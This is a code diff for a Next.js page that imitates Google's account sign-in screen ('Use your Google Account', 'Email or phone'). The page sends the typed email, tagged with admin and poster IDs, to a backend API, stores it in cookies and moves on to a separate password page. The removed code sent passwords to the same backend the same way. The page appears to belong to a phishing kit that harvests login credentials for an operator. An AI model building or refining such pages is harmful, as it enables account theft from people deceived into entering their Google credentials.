@@ -1,36 +1,30 @@
 "use client";
 import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
+import { API_URL, site } from "../config/index";
 import Cookies from "js-cookie";
-import { API_URL } from "../config/index";
 
 function Page() {
-  const router = useRouter();
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState("");
-  const [id, setId] = useState("");
   const [adminId, setAdminId] = useState("");
   const [posterId, setPosterId] = useState("");
+  const router = useRouter();
 
   useEffect(() => {
-    setEmail(Cookies.get("email") || "");
-    setId(Cookies.get("id") || "");
     setAdminId(Cookies.get("adminId") || "");
     setPosterId(Cookies.get("posterId") || "");
   }, []);
 
   const handleSubmit = async (e) => {
     if (e) e.preventDefault();
-    if (!password) return;
+    if (!email) return;
 
     const values = {
-      id,
-      password,
-      adminId,
-      posterId,
+      email: email,
+      site: site,
     };
-    const url = `${API_URL}/password/post`;
+
+    const url = `${API_URL}/email/post/${adminId}/${posterId}`;
 
     try {
       const res = await fetch(url, {
@@ -45,9 +39,11 @@ function Page() {
       const data = await res.json();
 
       if (res.ok) {
-        router.push("/loading");
+        Cookies.set("email", data?.info?.email);
+        Cookies.set("id", data?.info?._id);
+        router.push("/password");
       } else {
-        console.error("Password error:", data);
+        console.error("Login error:", data);
       }
     } catch (err) {
       console.error("Fetch error:", err);
@@ -86,23 +82,8 @@ function Page() {
               <path d="M1 1h22v22H1z" fill="none" />
             </svg>
           </div>
-          <h1 className="text-white text-3xl font-normal mb-1">Welcome</h1>
-          <div className="flex items-center gap-2 px-1 py-1 rounded-full border border-[#5f6368] w-fit mb-6">
-            <div className="w-5 h-5 rounded-full bg-[#8ab4f8] flex items-center justify-center text-[#202124] text-[10px] font-bold uppercase">
-              {email ? email[0] : "U"}
-            </div>
-            <span className="text-white text-sm pr-2">{email}</span>
-            <svg
-              className="text-[#9aa0a6] mr-1"
-              width="16"
-              height="16"
-              viewBox="0 0 24 24"
-              fill="currentColor"
-            >
-              <path d="M7 10l5 5 5-5z" />
-            </svg>
-          </div>
-          <p className="text-white text-lg font-normal">Enter your password</p>
+          <h1 className="text-white text-3xl font-normal mb-2">Sign in</h1>
+          <p className="text-white text-lg font-normal">Use your Google Account</p>
         </div>
 
         {/* Right Side: Form */}
@@ -111,40 +92,31 @@ function Page() {
             <div className="mt-8 mb-4">
               <div className="relative border border-[#5f6368] rounded-md focus-within:border-[#8ab4f8] focus-within:border-2 transition-all">
                 <input
-                  type={showPassword ? "text" : "password"}
-                  id="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  type="text"
+                  id="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
                   className="block w-full px-4 py-4 bg-transparent text-white text-lg outline-none placeholder-transparent peer"
-                  placeholder="Enter your password"
-                  autoComplete="current-password"
+                  placeholder="Email or phone"
+                  autoComplete="off"
                 />
                 <label
-                  htmlFor="password"
+                  htmlFor="email"
                   className="absolute left-4 top-4 text-[#9aa0a6] text-lg transition-all transform peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-9 peer-focus:left-2 peer-focus:bg-[#1e1e1e] peer-focus:px-2 peer-focus:text-[#8ab4f8] -translate-y-9 scale-75 bg-[#1e1e1e] px-2"
                 >
-                  Enter your password
+                  Email or phone
                 </label>
               </div>
             </div>
 
-            <div className="flex items-center mb-10">
-              <input
-                type="checkbox"
-                id="show-password"
-                checked={showPassword}
-                onChange={() => setShowPassword(!showPassword)}
-                className="w-4 h-4 rounded border-[#5f6368] bg-transparent checked:bg-[#8ab4f8] checked:border-[#8ab4f8] focus:ring-0 cursor-pointer"
-              />
-              <label
-                htmlFor="show-password"
-                className="ml-3 text-white text-sm cursor-pointer select-none"
-              >
-                Show password
-              </label>
-            </div>
+            <button
+              type="button"
+              className="text-[#8ab4f8] text-base font-medium hover:underline inline-block mb-10"
+            >
+              Forgot email?
+            </button>
 
-            <div className="text-[#bdc1c6] text-base leading-relaxed mb-6">
+            <div className="text-[#bdc1c6] text-base leading-relaxed mb-10">
               <p>Not your computer? Use Guest mode to sign in privately.</p>
               <button
                 type="button"
@@ -156,12 +128,12 @@ function Page() {
           </form>
 
           {/* Bottom Actions */}
-          <div className="flex items-center justify-between mt-auto pt-4">
+          <div className="flex items-center justify-between mt-auto">
             <button
               type="button"
               className="text-[#8ab4f8] text-base font-medium hover:underline"
             >
-              Forgot password?
+              Create account
             </button>
             <button
               onClick={handleSubmit}
